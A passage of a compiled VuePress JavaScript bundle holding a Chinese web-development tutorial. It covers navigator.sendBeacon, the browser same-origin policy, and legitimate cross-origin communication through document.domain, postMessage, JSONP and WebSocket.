"),a("p",[e._v("用户卸载网页的时候，有时需要向服务器发一些数据。很自然的做法是在"),a("code",[e._v("unload")]),e._v("事件或"),a("code",[e._v("beforeunload")]),e._v("事件的监听函数里面，使用"),a("code",[e._v("XMLHttpRequest")]),e._v("对象发送数据。但是，这样做不是很可靠，因为"),a("code",[e._v("XMLHttpRequest")]),e._v("对象是异步发送，很可能在它即将发送的时候，页面已经卸载了，从而导致发送取消或者发送失败。")]),e._v(" "),a("p",[e._v("解决方法就是"),a("code",[e._v("unload")]),e._v("事件里面，加一些很耗时的同步操作。这样就能留出足够的时间，保证异步 AJAX 能够发送成功。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("function log() {\n  let xhr = new XMLHttpRequest();\n  xhr.open('post', '/log', true);\n  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n  xhr.send('foo=bar');\n}\n\nwindow.addEventListener('unload', function(event) {\n  log();\n\n  // a time-consuming operation\n  for (let i = 1; i < 10000; i++) {\n    for (let m = 1; m < 10000; m++) { continue; }\n  }\n});\n")])])]),a("p",[e._v("上面代码中，强制执行了一次双重循环，拖长了"),a("code",[e._v("unload")]),e._v("事件的执行时间，导致异步 AJAX 能够发送成功。")]),e._v(" "),a("p",[e._v("类似的还可以使用"),a("code",[e._v("setTimeout")]),e._v("。下面是追踪用户点击的例子。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("// HTML 代码如下\n// <a id=\"target\" href=\"https://baidu.com\">click</a>\nconst clickTime = 350;\nconst theLink = document.getElementById('target');\n\nfunction log() {\n  let xhr = new XMLHttpRequest();\n  xhr.open('post', '/log', true);\n  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n  xhr.send('foo=bar');\n}\n\ntheLink.addEventListener('click', function (event) {\n  event.preventDefault();\n  log();\n\n  setTimeout(function () {\n    window.location.href = theLink.getAttribute('href');\n  }, clickTime);\n});\n")])])]),a("p",[e._v("上面代码使用"),a("code",[e._v("setTimeout")]),e._v("，拖延了350毫秒，才让页面跳转，因此使得异步 AJAX 有时间发出。")]),e._v(" "),a("p",[e._v("这些做法的共同问题是，卸载的时间被硬生生拖长了，后面页面的加载被推迟了，用户体验不好。")]),e._v(" "),a("p",[e._v("为了解决这个问题，浏览器引入了"),a("code",[e._v("Navigator.sendBeacon()")]),e._v("方法。这个方法还是异步发出请求，但是请求与当前页面线程脱钩，作为浏览器进程的任务，因此可以保证会把数据发出去，不拖延卸载流程。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("window.addEventListener('unload', logData, false);\n\nfunction logData() {\n  navigator.sendBeacon('/log', analyticsData);\n}\n")])])]),a("p",[a("code",[e._v("Navigator.sendBeacon")]),e._v("方法接受两个参数，第一个参数是目标服务器的 URL，第二个参数是所要发送的数据（可选），可以是任意类型（字符串、表单对象、二进制对象等等）。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("navigator.sendBeacon(url, data)\n")])])]),a("p",[e._v("这个方法的返回值是一个布尔值，成功发送数据为"),a("code",[e._v("true")]),e._v("，否则为"),a("code",[e._v("false")]),e._v("。")]),e._v(" "),a("p",[e._v("该方法发送数据的 HTTP 方法是 POST，可以跨域，类似于表单提交数据。它不能指定回调函数。")]),e._v(" "),a("p",[e._v("下面是一个例子。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("// HTML 代码如下\n// <body onload=\"analytics('start')\" onunload=\"analytics('end')\">\n\nfunction analytics(state) {\n  if (!navigator.sendBeacon) return;\n\n  var URL = 'http://example.com/analytics';\n  var data = 'state=' + state + '&location=' + window.location;\n  navigator.sendBeacon(URL, data);\n}\n")])])]),a("h2",{attrs:{id:"同源限制"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#同源限制"}},[e._v("#")]),e._v(" 同源限制")]),e._v(" "),a("p",[e._v("浏览器安全的基石是“同源政策”（"),a("a",{attrs:{href:"https://en.wikipedia.org/wiki/Same-origin_policy",target:"_blank",rel:"noopener noreferrer"}},[e._v("same-origin policy"),a("OutboundLink")],1),e._v("）。很多开发者都知道这一点，但了解得不全面。")]),e._v(" "),a("h3",{attrs:{id:"概述-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#概述-2"}},[e._v("#")]),e._v(" 概述")]),e._v(" "),a("h4",{attrs:{id:"含义"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#含义"}},[e._v("#")]),e._v(" 含义")]),e._v(" "),a("p",[e._v("1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。")]),e._v(" "),a("p",[e._v("最初，它的含义是指，A 网页设置的 Cookie，B 网页不能打开，除非这两个网页“同源”。所谓“同源”指的是“三个相同”。")]),e._v(" "),a("blockquote",[a("ul",[a("li",[e._v("协议相同")]),e._v(" "),a("li",[e._v("域名相同")]),e._v(" "),a("li",[e._v("端口相同（这点可以忽略，详见下文）")])])]),e._v(" "),a("p",[e._v("举例来说，"),a("code",[e._v("http://www.example.com/dir/page.html")]),e._v("这个网址，协议是"),a("code",[e._v("http://")]),e._v("，域名是"),a("code",[e._v("www.example.com")]),e._v("，端口是"),a("code",[e._v("80")]),e._v("（默认端口可以省略），它的同源情况如下。")]),e._v(" "),a("ul",[a("li",[a("code",[e._v("http://www.example.com/dir2/other.html")]),e._v("：同源")]),e._v(" "),a("li",[a("code",[e._v("http://example.com/dir/other.html")]),e._v("：不同源（域名不同）")]),e._v(" "),a("li",[a("code",[e._v("http://v2.www.example.com/dir/other.html")]),e._v("：不同源（域名不同）")]),e._v(" "),a("li",[a("code",[e._v("http://www.example.com:81/dir/other.html")]),e._v("：不同源（端口不同）")]),e._v(" "),a("li",[a("code",[e._v("https://www.example.com/dir/page.html")]),e._v("：不同源（协议不同）")])]),e._v(" "),a("p",[e._v("注意，标准规定端口不同的网址不是同源（比如8000端口和8001端口不是同源），但是浏览器没有遵守这条规定。实际上，同一个网域的不同端口，是可以互相读取 Cookie 的。")]),e._v(" "),a("h4",{attrs:{id:"目的"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#目的"}},[e._v("#")]),e._v(" 目的")]),e._v(" "),a("p",[e._v("同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。")]),e._v(" "),a("p",[e._v("设想这样一种情况：A 网站是一家银行，用户登录以后，A 网站在用户的机器上设置了一个 Cookie，包含了一些隐私信息。用户离开 A 网站以后，又去访问 B 网站，如果没有同源限制，B 网站可以读取 A 网站的 Cookie，那么隐私就泄漏了。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。")]),e._v(" "),a("p",[e._v("由此可见，同源政策是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。")]),e._v(" "),a("h4",{attrs:{id:"限制范围"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#限制范围"}},[e._v("#")]),e._v(" 限制范围")]),e._v(" "),a("p",[e._v("随着互联网的发展，同源政策越来越严格。目前，如果非同源，共有三种行为受到限制。")]),e._v(" "),a("blockquote",[a("p",[e._v("（1） 无法读取非同源网页的 Cookie、LocalStorage 和 IndexedDB。")]),e._v(" "),a("p",[e._v("（2） 无法接触非同源网页的 DOM。")]),e._v(" "),a("p",[e._v("（3） 无法向非同源地址发送 AJAX 请求（可以发送，但浏览器会拒绝接受响应）。")])]),e._v(" "),a("p",[e._v("另外，通过 JavaScript 脚本可以拿到其他窗口的"),a("code",[e._v("window")]),e._v("对象。如果是非同源的网页，目前允许一个窗口可以接触其他网页的"),a("code",[e._v("window")]),e._v("对象的九个属性和四个方法。")]),e._v(" "),a("ul",[a("li",[e._v("window.closed")]),e._v(" "),a("li",[e._v("window.frames")]),e._v(" "),a("li",[e._v("window.length")]),e._v(" "),a("li",[e._v("window.location")]),e._v(" "),a("li",[e._v("window.opener")]),e._v(" "),a("li",[e._v("window.parent")]),e._v(" "),a("li",[e._v("window.self")]),e._v(" "),a("li",[e._v("window.top")]),e._v(" "),a("li",[e._v("window.window")]),e._v(" "),a("li",[e._v("window.blur()")]),e._v(" "),a("li",[e._v("window.close()")]),e._v(" "),a("li",[e._v("window.focus()")]),e._v(" "),a("li",[e._v("window.postMessage()")])]),e._v(" "),a("p",[e._v("上面的九个属性之中，只有"),a("code",[e._v("window.location")]),e._v("是可读写的，其他八个全部都是只读。而且，即使是"),a("code",[e._v("location")]),e._v("对象，非同源的情况下，也只允许调用"),a("code",[e._v("location.replace()")]),e._v("方法和写入"),a("code",[e._v("location.href")]),e._v("属性。")]),e._v(" "),a("p",[e._v("虽然这些限制是必要的，但是有时很不方便，合理的用途也受到影响。下面介绍如何规避上面的限制。")]),e._v(" "),a("h3",{attrs:{id:"cookie-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#cookie-2"}},[e._v("#")]),e._v(" Cookie")]),e._v(" "),a("p",[e._v("Cookie 是服务器写入浏览器的一小段信息，只有同源的网页才能共享。如果两个网页一级域名相同，只是次级域名不同，浏览器允许通过设置"),a("code",[e._v("document.domain")]),e._v("共享 Cookie。")]),e._v(" "),a("p",[e._v("举例来说，A 网页的网址是"),a("code",[e._v("http://w1.example.com/a.html")]),e._v("，B 网页的网址是"),a("code",[e._v("http://w2.example.com/b.html")]),e._v("，那么只要设置相同的"),a("code",[e._v("document.domain")]),e._v("，两个网页就可以共享 Cookie。因为浏览器通过"),a("code",[e._v("document.domain")]),e._v("属性来检查是否同源。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("// 两个网页都需要设置\ndocument.domain = 'example.com';\n")])])]),a("p",[e._v("注意，A 和 B 两个网页都需要设置"),a("code",[e._v("document.domain")]),e._v("属性，才能达到同源的目的。因为设置"),a("code",[e._v("document.domain")]),e._v("的同时，会把端口重置为"),a("code",[e._v("null")]),e._v("，因此如果只设置一个网页的"),a("code",[e._v("document.domain")]),e._v("，会导致两个网址的端口不同，还是达不到同源的目的。")]),e._v(" "),a("p",[e._v("现在，A 网页通过脚本设置一个 Cookie。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('document.cookie = "test1=hello";\n')])])]),a("p",[e._v("B 网页就可以读到这个 Cookie。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var allCookie = document.cookie;\n")])])]),a("p",[e._v("注意，这种方法只适用于 Cookie 和 iframe 窗口，LocalStorage 和 IndexedDB 无法通过这种方法，规避同源政策，而要使用下文介绍 PostMessage API。")]),e._v(" "),a("p",[e._v("另外，服务器也可以在设置 Cookie 的时候，指定 Cookie 的所属域名为一级域名，比如"),a("code",[e._v("example.com")]),e._v("。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("Set-Cookie: key=value; domain=example.com; path=/\n")])])]),a("p",[e._v("这样的话，二级域名和三级域名不用做任何设置，都可以读取这个 Cookie。")]),e._v(" "),a("h3",{attrs:{id:"iframe-和多窗口通信"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#iframe-和多窗口通信"}},[e._v("#")]),e._v(" iframe 和多窗口通信")]),e._v(" "),a("p",[a("code",[e._v("iframe")]),e._v("元素可以在当前网页之中，嵌入其他网页。每个"),a("code",[e._v("iframe")]),e._v("元素形成自己的窗口，即有自己的"),a("code",[e._v("window")]),e._v("对象。"),a("code",[e._v("iframe")]),e._v("窗口之中的脚本，可以获得父窗口和子窗口。但是，只有在同源的情况下，父窗口和子窗口才能通信；如果跨域，就无法拿到对方的 DOM。")]),e._v(" "),a("p",[e._v("比如，父窗口运行下面的命令，如果"),a("code",[e._v("iframe")]),e._v("窗口不是同源，就会报错。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('document\n.getElementById("myIFrame")\n.contentWindow\n.document\n// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.\n')])])]),a("p",[e._v("上面命令中，父窗口想获取子窗口的 DOM，因为跨域导致报错。")]),e._v(" "),a("p",[e._v("反之亦然，子窗口获取主窗口的 DOM 也会报错。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("window.parent.document.body\n// 报错\n")])])]),a("p",[e._v("这种情况不仅适用于"),a("code",[e._v("iframe")]),e._v("窗口，还适用于"),a("code",[e._v("window.open")]),e._v("方法打开的窗口，只要跨域，父窗口与子窗口之间就无法通信。")]),e._v(" "),a("p",[e._v("如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的"),a("code",[e._v("document.domain")]),e._v("属性，就可以规避同源政策，拿到 DOM。")]),e._v(" "),a("p",[e._v("对于完全不同源的网站，目前有两种方法，可以解决跨域窗口的通信问题。")]),e._v(" "),a("blockquote",[a("ul",[a("li",[e._v("片段识别符（fragment identifier）")]),e._v(" "),a("li",[e._v("跨文档通信API（Cross-document messaging）")])])]),e._v(" "),a("h4",{attrs:{id:"片段识别符"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#片段识别符"}},[e._v("#")]),e._v(" 片段识别符")]),e._v(" "),a("p",[e._v("片段标识符（fragment identifier）指的是，URL 的"),a("code",[e._v("#")]),e._v("号后面的部分，比如"),a("code",[e._v("http://example.com/x.html#fragment")]),e._v("的"),a("code",[e._v("#fragment")]),e._v("。如果只是改变片段标识符，页面不会重新刷新。")]),e._v(" "),a("p",[e._v("父窗口可以把信息，写入子窗口的片段标识符。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var src = originURL + '#' + data;\ndocument.getElementById('myIFrame').src = src;\n")])])]),a("p",[e._v("上面代码中，父窗口把所要传递的信息，写入 iframe 窗口的片段标识符。")]),e._v(" "),a("p",[e._v("子窗口通过监听"),a("code",[e._v("hashchange")]),e._v("事件得到通知。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("window.onhashchange = checkMessage;\n\nfunction checkMessage() {\n  var message = window.location.hash;\n  // ...\n}\n")])])]),a("p",[e._v("同样的，子窗口也可以改变父窗口的片段标识符。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("parent.location.href = target + '#' + hash;\n")])])]),a("h4",{attrs:{id:"window-postmessage"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#window-postmessage"}},[e._v("#")]),e._v(" window.postMessage()")]),e._v(" "),a("p",[e._v("上面的这种方法属于破解，HTML5 为了解决这个问题，引入了一个全新的API：跨文档通信 API（Cross-document messaging）。")]),e._v(" "),a("p",[e._v("这个 API 为"),a("code",[e._v("window")]),e._v("对象新增了一个"),a("code",[e._v("window.postMessage")]),e._v("方法，允许跨窗口通信，不论这两个窗口是否同源。举例来说，父窗口"),a("code",[e._v("aaa.com")]),e._v("向子窗口"),a("code",[e._v("bbb.com")]),e._v("发消息，调用"),a("code",[e._v("postMessage")]),e._v("方法就可以了。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("// 父窗口打开一个子窗口\nvar popup = window.open('http://bbb.com', 'title');\n// 父窗口向子窗口发消息\npopup.postMessage('Hello World!', 'http://bbb.com');\n")])])]),a("p",[a("code",[e._v("postMessage")]),e._v("方法的第一个参数是具体的信息内容，第二个参数是接收消息的窗口的源（origin），即“协议 + 域名 + 端口”。也可以设为"),a("code",[e._v("*")]),e._v("，表示不限制域名，向所有窗口发送。")]),e._v(" "),a("p",[e._v("子窗口向父窗口发送消息的写法类似。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("// 子窗口向父窗口发消息\nwindow.opener.postMessage('Nice to see you', 'http://aaa.com');\n")])])]),a("p",[e._v("父窗口和子窗口都可以通过"),a("code",[e._v("message")]),e._v("事件，监听对方的消息。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("// 父窗口和子窗口都可以用下面的代码，\n// 监听 message 消息\nwindow.addEventListener('message', function (e) {\n  console.log(e.data);\n},false);\n")])])]),a("p",[a("code",[e._v("message")]),e._v("事件的参数是事件对象"),a("code",[e._v("event")]),e._v("，提供以下三个属性。")]),e._v(" "),a("blockquote",[a("ul",[a("li",[a("code",[e._v("event.source")]),e._v("：发送消息的窗口")]),e._v(" "),a("li",[a("code",[e._v("event.origin")]),e._v(": 消息发向的网址")]),e._v(" "),a("li",[a("code",[e._v("event.data")]),e._v(": 消息内容")])])]),e._v(" "),a("p",[e._v("下面的例子是，子窗口通过"),a("code",[e._v("event.source")]),e._v("属性引用父窗口，然后发送消息。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("window.addEventListener('message', receiveMessage);\nfunction receiveMessage(event) {\n  event.source.postMessage('Nice to see you!', '*');\n}\n")])])]),a("p",[e._v("上面代码有几个地方需要注意。首先，"),a("code",[e._v("receiveMessage")]),e._v("函数里面没有过滤信息的来源，任意网址发来的信息都会被处理。其次，"),a("code",[e._v("postMessage")]),e._v("方法中指定的目标窗口的网址是一个星号，表示该信息可以向任意网址发送。通常来说，这两种做法是不推荐的，因为不够安全，可能会被恶意利用。")]),e._v(" "),a("p",[a("code",[e._v("event.origin")]),e._v("属性可以过滤不是发给本窗口的消息。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("window.addEventListener('message', receiveMessage);\nfunction receiveMessage(event) {\n  if (event.origin !== 'http://aaa.com') return;\n  if (event.data === 'Hello World') {\n    event.source.postMessage('Hello', event.origin);\n  } else {\n    console.log(event.data);\n  }\n}\n")])])]),a("h4",{attrs:{id:"localstorage"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#localstorage"}},[e._v("#")]),e._v(" LocalStorage")]),e._v(" "),a("p",[e._v("通过"),a("code",[e._v("window.postMessage")]),e._v("，读写其他窗口的 LocalStorage 也成为了可能。")]),e._v(" "),a("p",[e._v("下面是一个例子，主窗口写入 iframe 子窗口的"),a("code",[e._v("localStorage")]),e._v("。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("window.onmessage = function(e) {\n  if (e.origin !== 'http://bbb.com') {\n    return;\n  }\n  var payload = JSON.parse(e.data);\n  localStorage.setItem(payload.key, JSON.stringify(payload.data));\n};\n")])])]),a("p",[e._v("上面代码中，子窗口将父窗口发来的消息，写入自己的 LocalStorage。")]),e._v(" "),a("p",[e._v("父窗口发送消息的代码如下。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var win = document.getElementsByTagName('iframe')[0].contentWindow;\nvar obj = { name: 'Jack' };\nwin.postMessage(\n  JSON.stringify({key: 'storage', data: obj}),\n  'http://bbb.com'\n);\n")])])]),a("p",[e._v("加强版的子窗口接收消息的代码如下。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("window.onmessage = function(e) {\n  if (e.origin !== 'http://bbb.com') return;\n  var payload = JSON.parse(e.data);\n  switch (payload.method) {\n    case 'set':\n      localStorage.setItem(payload.key, JSON.stringify(payload.data));\n      break;\n    case 'get':\n      var parent = window.parent;\n      var data = localStorage.getItem(payload.key);\n      parent.postMessage(data, 'http://aaa.com');\n      break;\n    case 'remove':\n      localStorage.removeItem(payload.key);\n      break;\n  }\n};\n")])])]),a("p",[e._v("加强版的父窗口发送消息代码如下。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var win = document.getElementsByTagName('iframe')[0].contentWindow;\nvar obj = { name: 'Jack' };\n// 存入对象\nwin.postMessage(\n  JSON.stringify({key: 'storage', method: 'set', data: obj}),\n  'http://bbb.com'\n);\n// 读取对象\nwin.postMessage(\n  JSON.stringify({key: 'storage', method: \"get\"}),\n  \"*\"\n);\nwindow.onmessage = function(e) {\n  if (e.origin != 'http://aaa.com') return;\n  console.log(JSON.parse(e.data).name);\n};\n")])])]),a("h3",{attrs:{id:"ajax"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ajax"}},[e._v("#")]),e._v(" AJAX")]),e._v(" "),a("p",[e._v("同源政策规定，AJAX 请求只能发给同源的网址，否则就报错。")]),e._v(" "),a("p",[e._v("除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制。")]),e._v(" "),a("blockquote",[a("ul",[a("li",[e._v("JSONP")]),e._v(" "),a("li",[e._v("WebSocket")]),e._v(" "),a("li",[e._v("CORS")])])]),e._v(" "),a("h4",{attrs:{id:"jsonp"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#jsonp"}},[e._v("#")]),e._v(" JSONP")]),e._v(" "),a("p",[e._v("JSONP 是服务器与客户端跨源通信的常用方法。最大特点就是简单易用，没有兼容性问题，老式浏览器全部支持，服务端改造非常小。")]),e._v(" "),a("p",[e._v("它的做法如下。")]),e._v(" "),a("p",[e._v("第一步，网页添加一个"),a("code",[e._v("<script>")]),e._v("元素，向服务器请求一个脚本，这不受同源政策限制，可以跨域请求。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('<script src="http://api.foo.com?callback=bar"><\/script>\n')])])]),a("p",[e._v("注意，请求的脚本网址有一个"),a("code",[e._v("callback")]),e._v("参数（"),a("code",[e._v("?callback=bar")]),e._v("），用来告诉服务器，客户端的回调函数名称（"),a("code",[e._v("bar")]),e._v("）。")]),e._v(" "),a("p",[e._v("第二步，服务器收到请求后，拼接一个字符串，将 JSON 数据放在函数名里面，作为字符串返回（"),a("code",[e._v("bar({...})")]),e._v("）。")]),e._v(" "),a("p",[e._v("第三步，客户端会将服务器返回的字符串，作为代码解析，因为浏览器认为，这是"),a("code",[e._v("<script>")]),e._v("标签请求的脚本内容。这时，客户端只要定义了"),a("code",[e._v("bar()")]),e._v("函数，就能在该函数体内，拿到服务器返回的 JSON 数据。")]),e._v(" "),a("p",[e._v("下面看一个实例。首先，网页动态插入"),a("code",[e._v("<script>")]),e._v("元素，由它向跨域网址发出请求。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("function addScriptTag(src) {\n  var script = document.createElement('script');\n  script.setAttribute('type', 'text/javascript');\n  script.src = src;\n  document.body.appendChild(script);\n}\n\nwindow.onload = function () {\n  addScriptTag('http://example.com/ip?callback=foo');\n}\n\nfunction foo(data) {\n  console.log('Your public IP address is: ' + data.ip);\n};\n")])])]),a("p",[e._v("上面代码通过动态添加"),a("code",[e._v("<script>")]),e._v("元素，向服务器"),a("code",[e._v("example.com")]),e._v("发出请求。注意，该请求的查询字符串有一个"),a("code",[e._v("callback")]),e._v("参数，用来指定回调函数的名字，这对于 JSONP 是必需的。")]),e._v(" "),a("p",[e._v("服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("foo({\n  'ip': '8.8.8.8'\n});\n")])])]),a("p",[e._v("由于"),a("code",[e._v("<script>")]),e._v("元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了"),a("code",[e._v("foo")]),e._v("函数，该函数就会立即调用。作为参数的 JSON 数据被视为 JavaScript 对象，而不是字符串，因此避免了使用"),a("code",[e._v("JSON.parse")]),e._v("的步骤。")]),e._v(" "),a("h4",{attrs:{id:"websocket"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#websocket"}},[e._v("#")]),e._v(" WebSocket")]),e._v(" "),a("p",[e._v("WebSocket 是一种通信协议，使用"),a("code",[e._v("ws://")]),e._v("（非加密）和"),a("code",[e._v("wss://")]),e._v("（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。")]),e._v(" "),a("p",[e._v("下面是一个例子，浏览器发出的 WebSocket 请求的头信息（摘自"),a("a",{attrs:{href:"https://en.wikipedia.org/wiki/WebSocket",target:"_blank",rel:"noopener noreferrer"}},[e._v("维基百科"),a("OutboundLink")],1),e._v("）。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("GET /chat HTTP/1.1\nHost: server.example.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\nSec-WebSocket-Protocol: chat, superchat\nSec-WebSocket-Version: 13\nOrigin: http://example.com\n")])])]),a("p",[e._v("上面代码中，有一个字段是"),a("code",[e._v("Origin")]),e._v("，表示该请求的请求源（origin），即发自哪个域名。")]),e._v(" "),a("p",[e._v("正是因为有了"),a("code",[e._v("Origin")]),e._v("这个字段，所以 WebSocket 才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("HTTP/1.1 101 Switching Protocols\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=\nSec-WebSocket-Protocol: chat\n")])])])])}),[],!1,null,null,null);t.default=v.exports}}]);